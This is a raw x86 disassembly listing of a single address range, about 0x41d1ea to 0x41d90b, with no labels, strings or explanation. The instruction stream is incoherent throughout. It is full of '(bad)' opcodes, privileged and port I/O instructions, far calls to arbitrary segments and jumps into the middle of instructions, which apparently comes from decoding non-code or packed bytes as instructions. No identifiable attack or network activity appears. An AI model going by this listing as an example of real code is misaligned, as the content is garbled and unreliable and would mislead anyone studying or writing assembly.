  41d1ea:	std    
  41d1eb:	and    al,0x98
  41d1ed:	mov    bl,BYTE PTR [ebx]
  41d1ef:	cs pop ecx
  41d1f1:	xor    DWORD PTR [edi],edx
  41d1f3:	ds je  0x41d1b1
  41d1f6:	mov    dl,0xd8
  41d1f8:	add    ebp,DWORD PTR [esi+0x8]
  41d1fb:	dec    edx
  41d1fc:	jmp    0x41d250
  41d1fe:	iret   
  41d1ff:	pop    es
  41d200:	popa   
  41d201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d202:	fs in  eax,dx
  41d204:	push   esi
  41d205:	int3   
  41d206:	xchg   ebp,eax
  41d207:	adc    ebx,DWORD PTR [eax-0x7fe820a5]
  41d20d:	xor    al,0x66
  41d20f:	nop/reserved BYTE PTR [ebx-0x11]
  41d213:	sub    DWORD PTR [ebp+eax*2-0xc4ac556],0xffffffe1
  41d21b:	les    edi,FWORD PTR [esp+eiz*8+0x2d95e7c9]
  41d222:	shl    DWORD PTR [ebx+0x3b60eb92],1
  41d228:	out    dx,al
  41d229:	push   ebx
  41d22a:	xor    al,0x75
  41d22c:	pop    ds
  41d22d:	mov    esp,0x22f98f5a
  41d232:	dec    edx
  41d233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d234:	inc    edx
  41d235:	cmp    ebp,DWORD PTR [edx-0x5b]
  41d238:	loop   0x41d25f
  41d23a:	mov    edi,0x6124c65f
  41d23f:	out    dx,eax
  41d240:	aas    
  41d241:	sar    BYTE PTR [ebp-0x33],0x46
  41d245:	aaa    
  41d246:	sahf   
  41d247:	mov    ecx,0xbedb6991
  41d24c:	inc    eax
  41d24d:	jo     0x41d1fa
  41d24f:	sub    eax,0x5b6faffe
  41d254:	pop    esi
  41d255:	xor    edx,esp
  41d257:	sbb    eax,0xe617798b
  41d25c:	pop    eax
  41d25d:	stc    
  41d25e:	out    0x58,al
  41d260:	jp     0x41d288
  41d262:	mov    ch,0xdc
  41d264:	leave  
  41d265:	inc    ebx
  41d266:	pop    edx
  41d267:	pop    esi
  41d268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d269:	test   BYTE PTR [eax],ah
  41d26b:	aas    
  41d26c:	xor    al,0xf
  41d26e:	test   BYTE PTR [ebp+ebp*8+0x554d832f],ch
  41d275:	nop
  41d276:	mov    cl,0xb1
  41d278:	or     bh,al
  41d27a:	pop    ss
  41d27b:	hlt    
  41d27c:	call   0xddc9:0x5862bf3
  41d283:	mov    ?,WORD PTR [ebx]
  41d285:	xor    edi,edx
  41d287:	jmp    0x41d237
  41d289:	push   eax
  41d28a:	jge    0x41d2ed
  41d28c:	fs pop es
  41d28e:	add    al,0x1c
  41d290:	mov    edi,DWORD PTR [ecx+0x5ddc29f5]
  41d296:	ret    0x9392
  41d299:	loop   0x41d2ea
  41d29b:	aad    0xa0
  41d29d:	mov    ebx,0x68446765
  41d2a2:	loop   0x41d313
  41d2a4:	mov    esi,0x2930a3a1
  41d2a9:	lock lea ebx,[ebp-0x7b6d421e]
  41d2b0:	add    ch,bh
  41d2b2:	sbb    edi,DWORD PTR [ebp-0x23bd8de0]
  41d2b8:	add    al,0x5
  41d2ba:	sahf   
  41d2bb:	cld    
  41d2bc:	lea    ebp,[ebx+0x77a4a55e]
  41d2c2:	dec    ebp
  41d2c3:	inc    esp
  41d2c4:	inc    esp
  41d2c5:	mov    bl,ch
  41d2c7:	iret   
  41d2c8:	les    edx,FWORD PTR [ecx]
  41d2ca:	mov    ds:0x33fb5967,al
  41d2cf:	pop    esp
  41d2d0:	je     0x41d2a2
  41d2d2:	push   es
  41d2d3:	sub    DWORD PTR [ebp+0x1e1eab34],edi
  41d2d9:	(bad)  
  41d2da:	mov    ds:0x84ff6386,eax
  41d2df:	fmul   DWORD PTR [ebp+0x35]
  41d2e2:	test   al,0x5f
  41d2e4:	dec    edx
  41d2e5:	ficomp WORD PTR [ebx-0x511bf4a8]
  41d2eb:	inc    DWORD PTR ds:0x6b7172de
  41d2f1:	inc    ebx
  41d2f2:	cmp    bl,bh
  41d2f4:	xor    al,BYTE PTR [ecx-0x2a]
  41d2f7:	cld    
  41d2f8:	xor    dl,BYTE PTR [edi-0x4b]
  41d2fb:	sar    DWORD PTR [eax],cl
  41d2fd:	ret    0x35ce
  41d300:	(bad)  
  41d301:	retf   0xb5c2
  41d304:	dec    eax
  41d305:	xchg   esp,eax
  41d306:	dec    edx
  41d307:	mov    ecx,0x5bbf8756
  41d30c:	scas   eax,DWORD PTR es:[edi]
  41d30d:	dec    eax
  41d30e:	lea    edx,[eax-0x34]
  41d311:	mov    ch,dh
  41d313:	dec    ecx
  41d314:	sub    esi,esp
  41d316:	daa    
  41d317:	sbb    BYTE PTR [ecx-0x23],bl
  41d31a:	fdivr  QWORD PTR [ecx+0x72]
  41d31d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d31e:	test   BYTE PTR [ecx-0x62],dl
  41d321:	mov    edi,edi
  41d323:	sbb    cl,BYTE PTR [esi+0x3b01327d]
  41d329:	cmp    esp,ebx
  41d32b:	je     0x41d2f6
  41d32d:	dec    ebx
  41d32e:	or     al,0x8f
  41d330:	dec    ecx
  41d331:	sbb    BYTE PTR [esi+0x504c3da2],ch
  41d337:	add    al,0xb7
  41d339:	mov    ah,0x81
  41d33b:	fisttp QWORD PTR [ecx+0x77e1587e]
  41d341:	out    0x65,al
  41d343:	xchg   esp,eax
  41d344:	xor    al,0x32
  41d346:	mov    cl,BYTE PTR [eax+ebx*2]
  41d349:	xor    bh,dh
  41d34b:	adc    BYTE PTR [ecx+0xede44de],al
  41d351:	das    
  41d352:	sbb    DWORD PTR [edi-0x65de66d],ebx
  41d358:	mov    DWORD PTR [ebx+0x5c],edx
  41d35b:	(bad)  
  41d35c:	sahf   
  41d35d:	jmp    0xce02aafd
  41d362:	int3   
  41d363:	lock les ecx,FWORD PTR es:[edx-0x61]
  41d368:	mov    edx,DWORD PTR [ecx-0x68078320]
  41d36e:	pop    eax
  41d36f:	push   edi
  41d370:	in     eax,0xd0
  41d372:	call   FWORD PTR [edx+0x74]
  41d375:	aam    0x6d
  41d377:	inc    esp
  41d378:	js     0x41d360
  41d37a:	adc    esi,DWORD PTR [esi-0x6b]
  41d37d:	inc    ebx
  41d37e:	call   0xebda:0x5b1482b8
  41d385:	(bad)  
  41d386:	sub    BYTE PTR [ebp+0x2627d6a8],dh
  41d38c:	lds    edx,FWORD PTR [bx+di-0x73]
  41d390:	test   dh,al
  41d392:	fsubr  DWORD PTR [ecx]
  41d394:	(bad)  
  41d395:	arpl   WORD PTR [edx-0x21],si
  41d398:	leave  
  41d399:	pop    edi
  41d39a:	mov    bh,0x6d
  41d39c:	jne    0x41d391
  41d39e:	push   ss
  41d39f:	cdq    
  41d3a0:	xchg   esp,eax
  41d3a1:	jmp    0x41d3fa
  41d3a3:	mov    al,0xc
  41d3a5:	sub    DWORD PTR [eax+0x4ece873e],0x376af8e
  41d3af:	imul   edx,DWORD PTR [eax+eax*2],0x7db9670f
  41d3b6:	inc    ecx
  41d3b7:	xor    eax,0x90a3420e
  41d3bc:	gs aam 0x26
  41d3bf:	mov    dl,0x2b
  41d3c1:	inc    esi
  41d3c2:	fmul   st,st(6)
  41d3c4:	and    dh,al
  41d3c6:	and    al,0xf2
  41d3c8:	imul   edi,ecx,0x42cb7fbf
  41d3ce:	xor    al,0xad
  41d3d0:	arpl   ax,cx
  41d3d2:	dec    edx
  41d3d3:	lea    edi,[esi-0x4b72cb23]
  41d3d9:	popf   
  41d3da:	retf   
  41d3db:	int    0x4
  41d3dd:	fadd   QWORD PTR ds:0x63a5ed6c
  41d3e3:	and    al,0x7c
  41d3e5:	or     ecx,DWORD PTR [edi]
  41d3e7:	mov    ch,0xa2
  41d3e9:	gs mov eax,0xaed142cb
  41d3ef:	push   eax
  41d3f0:	mov    edx,0xf9d49ba2
  41d3f5:	popa   
  41d3f6:	hlt    
  41d3f7:	pop    ss
  41d3f8:	jg     0x41d40d
  41d3fa:	out    0x41,eax
  41d3fc:	cmp    DWORD PTR [eax-0x71],esi
  41d3ff:	imul   ebp,DWORD PTR [eax],0x11c91b19
  41d405:	or     ah,BYTE PTR [esi-0x6b]
  41d408:	mov    ch,0x33
  41d40a:	mov    esp,0x9ac60c0
  41d40f:	mov    bl,0x98
  41d411:	xchg   esp,eax
  41d412:	adc    al,0x4b
  41d414:	lods   eax,DWORD PTR ds:[esi]
  41d415:	not    BYTE PTR [eax-0x59]
  41d418:	popa   
  41d419:	push   esp
  41d41a:	add    eax,0x1bb241f9
  41d41f:	or     ah,BYTE PTR [esi+0x49]
  41d422:	(bad)  
  41d424:	ret    
  41d425:	out    0x94,eax
  41d427:	pop    ebx
  41d428:	clc    
  41d429:	js     0x41d3f4
  41d42b:	arpl   dx,di
  41d42d:	(bad)  
  41d42e:	in     al,dx
  41d42f:	js     0x41d418
  41d431:	xor    eax,0x4527b577
  41d436:	pop    es
  41d437:	(bad)  
  41d438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d439:	push   esi
  41d43a:	hlt    
  41d43b:	push   ds
  41d43c:	push   ds
  41d43d:	xchg   ah,dh
  41d43f:	outs   dx,DWORD PTR ds:[esi]
  41d440:	cdq    
  41d441:	xchg   edi,eax
  41d442:	addr16 push esp
  41d444:	add    ah,BYTE PTR es:[edi+0x517e02e5]
  41d44b:	retf   
  41d44c:	sub    edx,DWORD PTR [edx-0x20]
  41d44f:	sbb    bl,dl
  41d451:	mov    al,0x3b
  41d453:	stc    
  41d454:	push   ecx
  41d455:	push   ss
  41d456:	icebp  
  41d457:	push   0x40
  41d459:	mov    DWORD PTR [edi],ebp
  41d45b:	xlat   BYTE PTR ds:[ebx]
  41d45c:	sbb    bh,BYTE PTR [edi]
  41d45e:	pop    esp
  41d45f:	sbb    al,BYTE PTR [ebx]
  41d461:	sahf   
  41d462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d463:	cld    
  41d464:	mov    ah,0xcb
  41d466:	and    edi,esp
  41d468:	xor    eax,0x463a2a06
  41d46d:	adc    cl,bl
  41d46f:	xchg   ecx,eax
  41d470:	sub    al,0x23
  41d472:	xchg   ebp,eax
  41d473:	sbb    BYTE PTR [eax+0x47],0x3d
  41d477:	faddp  st(5),st
  41d47a:	pop    edx
  41d47b:	mov    esi,0x3e7ff9cd
  41d480:	jge    0x41d42f
  41d482:	mov    ah,0x5b
  41d484:	stos   DWORD PTR es:[edi],eax
  41d485:	(bad)  
  41d486:	gs mov al,0xe5
  41d489:	push   ebp
  41d48a:	and    BYTE PTR [ecx+0x451d5e62],0xc0
  41d491:	jg     0x41d483
  41d493:	out    dx,eax
  41d494:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41d496:	mov    ecx,0x38efaa2f
  41d49b:	retf   
  41d49c:	fstp   QWORD PTR [edx+ecx*1]
  41d49f:	xchg   edx,eax
  41d4a0:	out    0xab,al
  41d4a2:	pop    eax
  41d4a3:	sub    al,0x34
  41d4a5:	ds (bad) 
  41d4a7:	es add al,0xa7
  41d4aa:	retf   
  41d4ab:	ret    
  41d4ac:	mov    al,ds:0x6000f556
  41d4b1:	push   ebp
  41d4b2:	adc    BYTE PTR [ebx-0x1747fa53],dh
  41d4b8:	es out 0x65,eax
  41d4bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4bc:	cmp    ebx,DWORD PTR [edx]
  41d4be:	push   eax
  41d4bf:	enter  0x1495,0x30
  41d4c3:	(bad)  
  41d4c4:	cld    
  41d4c5:	add    dl,al
  41d4c7:	aad    0x28
  41d4c9:	ficom  DWORD PTR [ebx-0x1c]
  41d4cc:	mov    dh,0xba
  41d4ce:	js     0x41d4af
  41d4d0:	jecxz  0x41d4da
  41d4d2:	jae    0x41d53d
  41d4d4:	retf   
  41d4d5:	inc    ecx
  41d4d6:	(bad)  
  41d4d8:	loopne 0x41d4da
  41d4da:	call   0x4203:0x8300ff5c
  41d4e1:	je     0x41d4c8
  41d4e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4e4:	test   dh,0x4a
  41d4e7:	or     al,0x7d
  41d4e9:	mov    DWORD PTR [esi-0x54],edx
  41d4ec:	in     al,0x73
  41d4ee:	dec    ebp
  41d4ef:	ret    
  41d4f0:	test   BYTE PTR [eax],ah
  41d4f2:	lods   eax,DWORD PTR ds:[esi]
  41d4f3:	mov    bh,0x4c
  41d4f5:	ds stos BYTE PTR es:[edi],al
  41d4f7:	arpl   WORD PTR [edx-0x61],si
  41d4fa:	mov    ds:0xf5a717e5,eax
  41d4ff:	jg     0x41d4f8
  41d501:	xor    BYTE PTR [ecx],0x19
  41d504:	fst    DWORD PTR [esi]
  41d506:	fiadd  DWORD PTR [eax+0x22e5a702]
  41d50c:	sbb    ah,BYTE PTR [ecx+0x624fafcf]
  41d512:	sub    bl,BYTE PTR [ecx]
  41d514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d515:	or     al,0x14
  41d517:	or     eax,0xe93b5b48
  41d51c:	in     al,0x69
  41d51e:	ds jg  0x41d500
  41d521:	mov    bl,0x24
  41d523:	bound  eax,QWORD PTR [edx]
  41d525:	adc    BYTE PTR [ebx-0xf],al
  41d528:	gs stos BYTE PTR es:[edi],al
  41d52a:	jb     0x41d504
  41d52c:	(bad)  
  41d52d:	jno    0x41d51f
  41d52f:	std    
  41d530:	sub    al,BYTE PTR [eax]
  41d532:	sbb    bh,BYTE PTR [esp+ecx*2-0x535d7e53]
  41d539:	outs   dx,BYTE PTR ds:[esi]
  41d53a:	pop    ds
  41d53b:	stos   DWORD PTR es:[edi],eax
  41d53c:	sbb    DWORD PTR [edx+0x4c],esp
  41d53f:	xchg   DWORD PTR [edi+0x3e],esi
  41d542:	iret   
  41d543:	jg     0x41d558
  41d545:	hlt    
  41d546:	leave  
  41d547:	jno    0x41d537
  41d549:	mov    dl,0xf1
  41d54b:	dec    eax
  41d54c:	lods   eax,DWORD PTR ds:[esi]
  41d54d:	lods   al,BYTE PTR es:[esi]
  41d54f:	push   esp
  41d550:	xor    BYTE PTR [edi+0x12d7e74d],bl
  41d556:	cmp    esp,DWORD PTR [esi+0x33]
  41d559:	(bad)  
  41d55a:	pop    edi
  41d55b:	fsub   QWORD PTR [edi+0x31]
  41d55e:	hlt    
  41d55f:	or     bl,cl
  41d561:	enter  0x7188,0x3f
  41d565:	mov    WORD PTR [ebx+edx*2],gs
  41d568:	cmp    al,0x3e
  41d56a:	mov    ds:0xb591ce21,al
  41d56f:	(bad)  
  41d570:	iret   
  41d571:	in     eax,dx
  41d572:	loope  0x41d538
  41d574:	icebp  
  41d575:	jl     0x41d511
  41d577:	das    
  41d578:	xor    BYTE PTR [edi-0x34],dh
  41d57b:	jns    0x41d528
  41d57d:	test   BYTE PTR [edi+0x43],0x76
  41d581:	dec    esp
  41d582:	iret   
  41d583:	fild   WORD PTR [esi-0x3a]
  41d586:	mov    ah,0x43
  41d588:	sub    bl,cl
  41d58a:	cmp    cl,BYTE PTR [edx+edi*2]
  41d58d:	jg     0x41d57d
  41d58f:	sbb    eax,0xad007738
  41d594:	sub    DWORD PTR [ebx+0x7f],esp
  41d597:	fist   DWORD PTR [ebx+0xe890f45]
  41d59d:	inc    edi
  41d59e:	js     0x41d5d9
  41d5a0:	in     al,dx
  41d5a1:	sub    eax,0x63d69629
  41d5a6:	setge  BYTE PTR [ebp+0x3]
  41d5aa:	adc    eax,0x858b6e3f
  41d5af:	dec    esp
  41d5b0:	or     al,0x90
  41d5b2:	pop    edi
  41d5b3:	adc    DWORD PTR [esi],ebx
  41d5b5:	ret    
  41d5b6:	cmp    DWORD PTR [edi+0x1],edi
  41d5b9:	out    0x3c,al
  41d5bb:	push   0x5ab8d2ae
  41d5c0:	(bad)  
  41d5c2:	sti    
  41d5c3:	xor    DWORD PTR [ecx+0x28bc29b9],ecx
  41d5c9:	cmp    al,BYTE PTR [ecx+0x7f3b0358]
  41d5cf:	push   ss
  41d5d0:	fnsave ds:0xa33e9539
  41d5d6:	cmp    eax,0x50ffeb3b
  41d5db:	ficom  WORD PTR [edx-0x26ef0f54]
  41d5e1:	add    ah,BYTE PTR [ecx-0x24]
  41d5e4:	mov    esp,DWORD PTR [esi+0x3ddaf8a5]
  41d5ea:	mov    ebp,0xe7b71db8
  41d5ef:	gs (bad) 
  41d5f1:	pop    edx
  41d5f2:	inc    esi
  41d5f3:	fiadd  DWORD PTR [ebx]
  41d5f5:	sbb    al,0x20
  41d5f7:	cli    
  41d5f8:	arpl   WORD PTR [edi],si
  41d5fa:	adc    ecx,DWORD PTR [eax]
  41d5fc:	mov    edi,0xda0e1a59
  41d601:	push   cs
  41d602:	sar    BYTE PTR [ebx+0x6e],0x7a
  41d606:	inc    ecx
  41d607:	into   
  41d608:	xchg   esi,eax
  41d609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d60a:	rcr    DWORD PTR [edx],1
  41d60c:	in     al,0x87
  41d60e:	sbb    DWORD PTR [esi-0x14],0x21c1f2f9
  41d615:	addr16 int 0x5f
  41d618:	jbe    0x41d679
  41d61a:	cwde   
  41d61b:	mov    BYTE PTR [edi+0x5a],al
  41d61e:	gs scas al,BYTE PTR es:[edi]
  41d620:	jb     0x41d601
  41d622:	retf   
  41d623:	shl    BYTE PTR [eax],cl
  41d625:	push   ss
  41d626:	mov    al,ds:0xad3a2e56
  41d62b:	loop   0x41d653
  41d62d:	loopne 0x41d643
  41d62f:	jne    0x41d641
  41d631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d632:	sahf   
  41d633:	sbb    eax,0xf4aa6022
  41d638:	test   edi,ecx
  41d63a:	pop    edi
  41d63b:	add    edi,DWORD PTR [ecx]
  41d63d:	hlt    
  41d63e:	cwde   
  41d63f:	add    dl,BYTE PTR [ecx+0xd]
  41d642:	mov    ah,0xdd
  41d644:	ds pop eax
  41d646:	adc    bl,BYTE PTR [esi-0x549ad73e]
  41d64c:	and    al,0xa7
  41d64e:	bound  esp,QWORD PTR [ebp-0x6f]
  41d651:	push   ecx
  41d652:	fdiv   QWORD PTR [esi+0x1955f8b2]
  41d658:	aam    0xfa
  41d65a:	sti    
  41d65b:	test   eax,0xfb63a075
  41d660:	sbb    DWORD PTR [edx+ecx*8-0x3d41f030],esi
  41d667:	jnp    0x41d672
  41d669:	out    dx,eax
  41d66a:	(bad)  
  41d66b:	int    0x61
  41d66d:	push   0x2616e1f8
  41d672:	lods   eax,DWORD PTR ds:[esi]
  41d673:	mov    ah,0x60
  41d675:	pcmpeqb mm3,mm6
  41d678:	mov    ebp,0x7fdc209
  41d67d:	mov    cl,0x38
  41d67f:	sub    eax,0x49f024d4
  41d684:	lahf   
  41d685:	mov    dh,0x57
  41d687:	mov    dh,0xa0
  41d689:	ins    BYTE PTR es:[edi],dx
  41d68a:	mov    DWORD PTR [ebx],0x3d0f5974
  41d690:	ffreep st(7)
  41d692:	inc    eax
  41d693:	leave  
  41d694:	inc    ebp
  41d695:	shl    DWORD PTR [ebx-0x4d],1
  41d698:	ins    BYTE PTR es:[edi],dx
  41d699:	mov    es,WORD PTR [eax+0x32]
  41d69c:	xchg   esi,eax
  41d69d:	xchg   ebx,eax
  41d69e:	pop    ds
  41d69f:	mov    dh,0x59
  41d6a1:	mov    dl,0xcd
  41d6a3:	dec    ebp
  41d6a4:	inc    ecx
  41d6a5:	and    DWORD PTR [esi],ebp
  41d6a7:	std    
  41d6a8:	dec    edx
  41d6a9:	add    edx,DWORD PTR [ebp+0x26]
  41d6ac:	in     eax,dx
  41d6ad:	call   0x5ef6:0x897f2779
  41d6b4:	jns    0x41d697
  41d6b6:	mov    ebx,DWORD PTR [ecx-0x10]
  41d6b9:	jle    0x41d6d8
  41d6bb:	in     al,0xcc
  41d6bd:	lea    edi,[ebx+0x1a]
  41d6c0:	xchg   esi,eax
  41d6c1:	jecxz  0x41d702
  41d6c3:	adc    ah,BYTE PTR ds:0x57af493c
  41d6c9:	(bad)  
  41d6ca:	cld    
  41d6cb:	das    
  41d6cc:	rcl    DWORD PTR [ebp-0x20],cl
  41d6cf:	sbb    BYTE PTR [ebp+0x14],0x40
  41d6d3:	sbb    al,0xaf
  41d6d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6d6:	adc    BYTE PTR [edi],0x45
  41d6d9:	sbb    ecx,edi
  41d6db:	out    0x8f,eax
  41d6dd:	pop    ebp
  41d6de:	inc    ecx
  41d6df:	ror    BYTE PTR [esi+0x20],0x87
  41d6e3:	test   BYTE PTR [ecx+0x51],ah
  41d6e6:	cli    
  41d6e7:	and    esp,edi
  41d6e9:	bound  ebx,QWORD PTR [edx]
  41d6eb:	mov    edx,0x7b2b9ad2
  41d6f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6f1:	cmp    eax,0xedbace6b
  41d6f6:	mov    BYTE PTR [eax],bl
  41d6f8:	sbb    dh,BYTE PTR [eax+0x68]
  41d6fb:	(bad)  
  41d6fc:	ss jo  0x41d746
  41d6ff:	in     eax,0x74
  41d701:	sbb    cl,dl
  41d703:	retf   
  41d704:	inc    ebp
  41d705:	or     eax,eax
  41d707:	aad    0x46
  41d709:	mov    ch,0xd9
  41d70b:	mov    eax,ds:0x909f0c15
  41d710:	dec    ebx
  41d711:	sub    DWORD PTR [ebp+0x2d99f594],ecx
  41d717:	xchg   ebx,eax
  41d718:	mov    dh,0x61
  41d71a:	push   0x2e
  41d71c:	sub    BYTE PTR [eax-0x3e],ch
  41d71f:	add    DWORD PTR cs:[edx+0x2b],ebx
  41d723:	add    al,BYTE PTR [ecx+ecx*2+0x25d1802c]
  41d72a:	aam    0x56
  41d72c:	iret   
  41d72d:	iret   
  41d72e:	ins    DWORD PTR es:[edi],dx
  41d72f:	cmp    DWORD PTR [bx+di-0x63],ecx
  41d733:	mov    dh,0x56
  41d735:	pop    ecx
  41d736:	xlat   BYTE PTR ds:[ebx]
  41d737:	call   DWORD PTR [edx+edi*1-0x3357d276]
  41d73e:	cs jno 0x41d779
  41d741:	arpl   di,si
  41d743:	inc    ebx
  41d744:	xchg   ebp,eax
  41d745:	fiadd  WORD PTR [ebp-0xb6a88e2]
  41d74b:	xor    cl,BYTE PTR [ebx+eax*2+0x2e517cd0]
  41d752:	push   0x6b
  41d754:	(bad)  
  41d755:	push   esi
  41d756:	repz and DWORD PTR [eax-0xe],ebp
  41d75a:	nop
  41d75b:	sub    edx,edx
  41d75d:	push   ebp
  41d75e:	mov    ebp,0x54b0f93b
  41d763:	gs xchg ecx,ebx
  41d766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d767:	adc    al,0xcc
  41d769:	cmp    bl,BYTE PTR [esp+ebp*1]
  41d76c:	popf   
  41d76d:	sbb    ah,BYTE PTR [ebp-0x29c16e44]
  41d773:	ins    BYTE PTR es:[edi],dx
  41d774:	mov    ebx,0xaef27d8
  41d779:	jmp    0x9a33:0xa4f4ca7
  41d780:	cmp    ecx,DWORD PTR [eax-0x7d116340]
  41d786:	aam    0x22
  41d788:	mov    al,ds:0xde0c39d2
  41d78d:	xchg   edx,eax
  41d78e:	arpl   WORD PTR [edx],si
  41d790:	cs push esp
  41d792:	or     ebx,DWORD PTR [ebp+0x5a]
  41d795:	fdivr  QWORD PTR [ebx-0x67]
  41d798:	push   cs
  41d799:	cmp    al,0xe0
  41d79b:	push   edi
  41d79c:	mov    bl,0x64
  41d79e:	dec    eax
  41d79f:	mov    DWORD PTR [esi+edi*4],edi
  41d7a2:	mov    bh,0x86
  41d7a4:	ja     0x41d7e1
  41d7a6:	add    BYTE PTR [esi+0x6b8cafe5],bh
  41d7ac:	cmp    ch,BYTE PTR [edx-0x63]
  41d7af:	fmul   st,st(6)
  41d7b1:	jns    0x41d7a9
  41d7b3:	cdq    
  41d7b4:	xlat   BYTE PTR ds:[ebx]
  41d7b5:	lds    ebp,FWORD PTR [ebx+ebp*8-0x25]
  41d7b9:	jecxz  0x41d82e
  41d7bb:	adc    DWORD PTR [ebp+0x2f],edx
  41d7be:	push   DWORD PTR [ebp-0x7e329442]
  41d7c4:	int    0x47
  41d7c6:	sbb    edx,ebx
  41d7c8:	or     eax,0x5aa03386
  41d7cd:	stc    
  41d7ce:	(bad)  
  41d7cf:	cli    
  41d7d0:	dec    eax
  41d7d1:	sbb    ebp,DWORD PTR gs:[ebx+eiz*1+0x754eefc]
  41d7d9:	xchg   esi,eax
  41d7da:	dec    esp
  41d7db:	pop    edx
  41d7dd:	xchg   ebx,eax
  41d7de:	or     edi,ecx
  41d7e0:	fucomp st(6)
  41d7e2:	lods   eax,DWORD PTR ds:[esi]
  41d7e3:	leave  
  41d7e4:	jo     0x41d81d
  41d7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7e7:	dec    ebp
  41d7e8:	xlat   BYTE PTR ds:[ebx]
  41d7e9:	ffree  st(0)
  41d7eb:	inc    ecx
  41d7ec:	cwde   
  41d7ed:	(bad)  
  41d7ee:	repz jbe 0x41d7bb
  41d7f1:	stos   DWORD PTR es:[edi],eax
  41d7f2:	lods   eax,DWORD PTR ds:[esi]
  41d7f4:	inc    eax
  41d7f5:	aam    0x9b
  41d7f7:	push   esp
  41d7f8:	dec    esp
  41d7f9:	in     al,dx
  41d7fa:	cli    
  41d7fb:	jle    0x41d796
  41d7fd:	adc    BYTE PTR [eax+0x61912b4c],0x0
  41d804:	xor    al,0xa4
  41d806:	mov    ds:0x1c8a3ea1,al
  41d80b:	xor    dh,BYTE PTR [edi]
  41d80d:	xor    eax,ebx
  41d80f:	pop    ss
  41d810:	call   0xf91a:0x45100042
  41d817:	xchg   ebp,eax
  41d818:	or     dl,BYTE PTR [ecx]
  41d81a:	xor    ebp,DWORD PTR [esi]
  41d81c:	inc    esp
  41d81d:	loop   0x41d7b8
  41d81f:	das    
  41d820:	xchg   edi,eax
  41d821:	adc    DWORD PTR [edi+0x15bf1c03],edx
  41d827:	adc    eax,DWORD PTR [edi]
  41d829:	jmp    0x41d7fe
  41d82b:	das    
  41d82c:	mov    BYTE PTR [eax+0x202f2301],ah
  41d832:	push   0x5dd02c5f
  41d837:	(bad)  
  41d839:	stc    
  41d83a:	xchg   ebp,eax
  41d83b:	retf   0x4a3f
  41d83e:	add    edi,DWORD PTR [edx-0x2c9dde32]
  41d844:	pop    ebp
  41d845:	inc    edi
  41d846:	adc    dl,BYTE PTR [esi]
  41d848:	cmc    
  41d849:	loope  0x41d87b
  41d84b:	int3   
  41d84c:	cmp    eax,0xdd86f9c2
  41d851:	mov    dh,0xe1
  41d853:	or     BYTE PTR [ecx+0x4c],ah
  41d856:	or     eax,DWORD PTR [ecx-0x31bc00e8]
  41d85c:	out    0x80,al
  41d85e:	hlt    
  41d85f:	lahf   
  41d860:	mov    ch,BYTE PTR [ecx-0x1bc5541d]
  41d866:	shl    BYTE PTR [edi+0x13],cl
  41d869:	jns    0x41d840
  41d86b:	lods   eax,DWORD PTR ds:[esi]
  41d86c:	loop   0x41d80e
  41d86e:	inc    edx
  41d86f:	das    
  41d870:	sahf   
  41d871:	inc    ecx
  41d872:	or     al,0xea
  41d874:	xchg   ebp,eax
  41d875:	dec    edi
  41d876:	push   ebp
  41d877:	mov    ah,0xc2
  41d879:	and    BYTE PTR [esi],ah
  41d87b:	mov    esp,0x13ef459e
  41d880:	jns    0x41d80e
  41d882:	push   0x2340a306
  41d887:	ss sbb bh,dl
  41d88a:	push   ebp
  41d88b:	sbb    eax,0xf084cc08
  41d890:	cmp    eax,0x5dc83600
  41d895:	pop    eax
  41d896:	mov    WORD PTR [eax],es
  41d898:	or     esp,DWORD PTR [esi-0x18]
  41d89b:	or     edi,DWORD PTR [eax]
  41d89d:	in     eax,dx
  41d89e:	loopne 0x41d916
  41d8a0:	or     esi,DWORD PTR [ebx+0x532a8fb4]
  41d8a6:	mov    DWORD PTR [esi-0x4c20b5f9],esi
  41d8ac:	jl     0x41d849
  41d8ae:	cdq    
  41d8af:	add    DWORD PTR [ebp-0x1e710717],0x4a9050d4
  41d8b9:	(bad)  
  41d8ba:	xor    esi,DWORD PTR [eax-0xa]
  41d8bd:	sub    BYTE PTR [ebp+esi*2-0x43708ba9],ch
  41d8c4:	mov    eax,ds:0xc938d83d
  41d8c9:	lods   al,BYTE PTR gs:[esi]
  41d8cb:	mov    ds:0x2fad4db9,al
  41d8d0:	mov    BYTE PTR [ecx],bh
  41d8d2:	ret    
  41d8d3:	xor    esp,DWORD PTR [esi-0x22b307b0]
  41d8d9:	dec    eax
  41d8da:	popf   
  41d8db:	outs   dx,BYTE PTR ds:[esi]
  41d8dc:	push   edx
  41d8dd:	inc    ebp
  41d8de:	xchg   DWORD PTR [edx-0x1ae77826],edi
  41d8e4:	adc    al,0x49
  41d8e6:	js     0x41d964
  41d8e8:	stos   DWORD PTR es:[edi],eax
  41d8e9:	jno    0x41d8a5
  41d8eb:	div    BYTE PTR [esp+eax*2]
  41d8ee:	ds dec ebx
  41d8f0:	out    0xcc,eax
  41d8f2:	adc    al,0xe3
  41d8f4:	jl     0x41d8ac
  41d8f6:	stos   DWORD PTR es:[edi],eax
  41d8f7:	pop    ebp
  41d8f8:	frstor [edi]
  41d8fa:	leave  
  41d8fb:	popa   
  41d8fc:	push   cs
  41d8fd:	and    esp,DWORD PTR [esi]
  41d8ff:	dec    ebp
  41d900:	loopne 0x41d8ed
  41d902:	pop    ebx
  41d903:	inc    ecx
  41d904:	add    DWORD PTR [ecx+0x35c035e6],edi
  41d90a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d90b:	dec    ebp
